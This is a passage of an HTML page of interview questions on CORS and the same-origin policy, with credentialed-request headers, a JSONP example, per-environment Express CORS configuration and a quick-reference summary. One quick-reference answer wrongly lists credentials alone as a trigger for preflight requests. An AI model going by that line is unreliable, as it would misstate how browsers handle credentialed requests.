Access-Control-Allow-Credentials: true</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8025-b67a-d2f91b72d610" class=""><strong>Critical Rule:</strong><br/>- <strong>Cannot use wildcard (</strong><code><strong>*</strong></code><strong>) with credentials</strong><br/>- Must specify exact origin</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807c-9581-f49d07d0e4dc" class=""><strong>Example Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8039-9297-e893d80ba983" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Request
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Cookie: sessionId=abc123

# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Set-Cookie: sessionId=xyz789; HttpOnly; Secure; SameSite=None

{&quot;data&quot;: &quot;value&quot;}</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8055-8058-f27ff3b05618" class=""><strong>Important:</strong><br/>- Credentials include cookies, HTTP authentication, client certificates<br/>- When credentials are used, <code>Access-Control-Allow-Origin</code> cannot be <code>*</code><br/>- Server must specify exact origin<br/>- Cookies may need <code>SameSite=None</code> for cross-origin requests</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8056-a4fb-dfa06f1e985b"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-806e-8257-e03ea4d1e8b0" class="">Q19: What is the difference between CORS and JSONP?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e4-beb5-d817f18d0f94" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f8-bf01-ddb1ce674d29" class=""><strong>CORS:</strong><br/>- Modern standard (W3C)<br/>- Supports all HTTP methods (GET, POST, PUT, DELETE, etc.)<br/>- Supports custom headers<br/>- Supports credentials<br/>- Server-controlled (secure)<br/>- Recommended approach</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d4-85db-c5d1eb7fe14c" class=""><strong>JSONP:</strong><br/>- Older technique (workaround)<br/>- Only supports GET requests<br/>- No custom headers<br/>- No credentials<br/>- Client-controlled (less secure)<br/>- Not recommended</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8092-b45d-c84f103afd6f" class=""><strong>JSONP Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d4-a900-de2c5e2a47bd" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// JSONP works by exploiting &lt;script&gt; tags// Scripts are not subject to SOP// Server returns:callback({&quot;data&quot;: &quot;value&quot;});// Client:&lt;script src=&quot;https://api.example.com/data?callback=handleData&quot;&gt;&lt;/script&gt;&lt;script&gt;function handleData(data) {
  console.log(data);}
&lt;/script&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d7-a536-d8a218ffee0e" class=""><strong>Why CORS is Better:</strong><br/>- More secure (server-controlled)<br/>- Supports all HTTP methods<br/>- Supports credentials<br/>- Standard approach<br/>- Better error handling</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80b8-8fe7-e76646dd9f1c"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-802d-9e31-cbe7317b0063" class="">Q20: How do you implement CORS for multiple environments (dev, staging, production)?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f5-8da6-ea9d88286c36" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cf-a928-d53f5db2968b" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80dd-8f13-ffa5b4143bd7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const corsConfig = {
  development: {
    origin: [
      &#x27;http://localhost:3000&#x27;,      &#x27;http://localhost:3001&#x27;,      &#x27;http://127.0.0.1:3000&#x27;    ],    credentials: true,    methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;],    allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;]
  },  staging: {
    origin: [
      &#x27;https://staging.example.com&#x27;,      &#x27;https://staging-app.example.com&#x27;    ],    credentials: true,    methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;],    allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;]
  },  production: {
    origin: [
      &#x27;https://example.com&#x27;,      &#x27;https://app.example.com&#x27;    ],    credentials: true,    methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;],    allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;]
  }
};const env = process.env.NODE_ENV || &#x27;development&#x27;;app.use(cors(corsConfig[env]));</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f9-a600-e8610c328130" class=""><strong>Using Environment Variables:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-805c-8f97-eb8d4307801c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// .env fileALLOWED_ORIGINS_DEV=http://localhost:3000,http://localhost:3001ALLOWED_ORIGINS_STAGING=https://staging.example.comALLOWED_ORIGINS_PROD=https://example.com,https://app.example.com// Codeconst allowedOrigins = process.env[`ALLOWED_ORIGINS_${env.toUpperCase()}`]
  .split(&#x27;,&#x27;)
  .map(origin =&gt; origin.trim());app.use(cors({
  origin: allowedOrigins,  credentials: true}));</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80cf-882c-fcc5aa1d7c84"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8069-991f-dca224697f24" class="">Quick Reference Answers</h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8053-802e-f5f58f824083" class="">What is SOP?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-806b-9da6-c56078435239" class=""><strong>Answer:</strong> Browser security mechanism that restricts cross-origin access.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-808e-958e-e745497d377f" class="">What is CORS?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-809b-ba74-e195bce0ce43" class=""><strong>Answer:</strong> Mechanism that allows servers to specify which origins can access resources.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8002-a5fc-e5b6d46c6522" class="">Does CORS protect your server?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-801f-b520-eff1dbf4cdfe" class=""><strong>Answer:</strong> No, CORS is browser-enforced. Direct requests bypass CORS.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80c5-ac9d-f5a9a07dabb1" class="">Can you use wildcard with credentials?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-806b-9e92-c1d5bb4385f2" class=""><strong>Answer:</strong> No, browsers will reject <code>Access-Control-Allow-Origin: *</code> with credentials.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80a0-8a7e-de76a65fcdc3" class="">What triggers a preflight request?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-809a-acd7-c5e816a71180" class=""><strong>Answer:</strong> Custom headers, non-simple methods, non-simple Content-Type, or credentials.</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8056-8ebe-d001cab53d9d"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-809b-96ed-ee511ae377fc" class="">Summary</h2></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ed-bffb-e2e3b7db5f7e" class="">These interview questions cover:<br/>- ✅ Fundamental concepts (SOP, CORS, origins)<br/>- ✅ Implementation details<br/>- ✅ Security vulnerabilities<br/>- ✅ Best practices<br/>- ✅ Real-world scenarios</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cb-a190-e3ed233e1a0e" class=""><strong>Key takeaway:</strong> CORS is a browser-enforced relaxation of SOP, not a server security feature. Always validate Origin headers and use whitelists, never wildcards with credentials.</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>